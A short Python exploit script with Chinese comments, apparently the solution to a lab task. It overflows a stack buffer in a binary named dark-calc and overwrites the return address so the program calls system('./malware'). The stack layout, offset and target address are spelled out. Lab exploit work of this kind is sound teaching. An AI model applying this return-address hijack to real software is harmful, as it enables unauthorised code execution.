#!/usr/bin/env python3
"""任务3：利用 dark-calc 的栈溢出漏洞执行 ./malware。

思路（控制流劫持，跳过字符串拼接）：
  input() 用 gets 把输入读进 16 字节的 expression，之后 strcpy 到全局
  command_buf(0x6030d0)。strcpy 遇到 '\\x00' 就停，所以 command_buf 只会
  得到 "./malware"。然后溢出覆盖 input 的返回地址，直接跳到 eval 里
  "mov $0x6030d0,%edi ; call system@plt"（0x401a6b），绕过 echo $(( )) 的
  包裹，相当于直接 system("./malware")。
栈布局：expression[16] | 保存的 rbp[8] | 返回地址[8]  → 偏移 24 到返回地址。
"""
import sys

RET_OFFSET  = 24            # 16(buffer) + 8(saved rbp)
SYSTEM_CALL = 0x401a6b      # eval 内 mov $command_buf,%edi ; call system@plt

payload  = b"./malware\x00"                       # strcpy 复制到 command_buf，'\0' 截断
payload += b"A" * (RET_OFFSET - len(payload))     # 填满 buffer + saved rbp
payload += SYSTEM_CALL.to_bytes(8, "little")      # 覆盖返回地址

sys.stdout.buffer.write(payload)
